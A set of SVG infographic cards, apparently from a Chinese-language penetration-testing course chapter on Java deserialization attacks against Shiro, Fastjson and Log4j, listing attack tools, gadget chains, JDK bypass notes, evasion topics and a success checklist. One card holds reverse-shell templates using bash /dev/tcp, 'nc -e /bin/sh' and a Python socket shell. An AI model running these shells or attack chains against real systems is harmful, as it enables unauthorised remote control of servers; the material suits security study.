  <defs><linearGradient id="ge7h8j8je" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#ge7h8j8je)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#422006" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 工具箱 Top10</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ysoserial 反序列化</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">marshalsec LDAP/RMI</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI-Injection-Exploit</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDIExploit 1.x</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ShiroScan</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">shiro.py</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">fastjson-scan</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">log4j2-scan</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Burp被动插件</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nuclei</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gbc0951i6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gbc0951i6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 Fastjson 利用链分类</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDI远程链</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">TemplatesImpl本地字节码</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CommonsCollections本地链</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">BadAttributeValueExpExcept</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ROME链</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SpringAOP链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g73fysml6" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g73fysml6)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#075985" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🌐 JDK版本兼容矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 6/7 早期 100%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u121 trustURLCodebase</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u191 LDAP白名单限制</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">TomcatEL 本地BeanFactory</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Groovy 本地链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g6q47636d" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g6q47636d)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📡 出网/半出网/不出网</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出网: JNDI 一键RCE</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">半出网: DNSLog盲探测</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网 本地Factory</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网 Groovy/TomcatEL</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网 信息泄露链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g7mwp9xbt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g7mwp9xbt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛠️ 反弹Shell 备忘集合</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">bash -i &gt;&amp; /dev/tcp/ip/p 0&gt;&amp;1</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">nc -e /bin/sh ip port</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">python -c socket pty</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Runtime.getRuntime.exec(cmd[])</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ProcessBuilder(cmd[])</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g2np0w0h3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g2np0w0h3)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 本章难度与学习曲线</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro-550 ███████░░ 70%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson 1.2.24 ██████░░░ 60%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson 1.2.47 █████░░░░ 50%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro-721 ████░░░░░ 40%</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Log4Shell ███████░░ 70%</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="glc3n3fca" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#glc3n3fca)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 后续学习路径分支</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">A: CC链深挖+Java反序列化原理</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">B: 中间件 Weblogic/JBoss/IIS</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">C: 内存马+免杀+RASP对抗</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">D: 不出网场景深入利用</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gqxee8t70" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gqxee8t70)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚠️ 常见坑点避坑指南</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK版本高JNDI失效</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JCE无限制策略缺失</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">目标内网严格不出网</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Commons版本不匹配</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PaddingException填充错</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gc7zemux7" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gc7zemux7)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro550 key爆破命中</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson 1.2.24 DNSLog成功</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson 1.2.47 Bypass成功</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Log4Shell 信息泄露成功</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">目标反弹shell成功</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">升级后漏洞全部失效</text>
</svg>
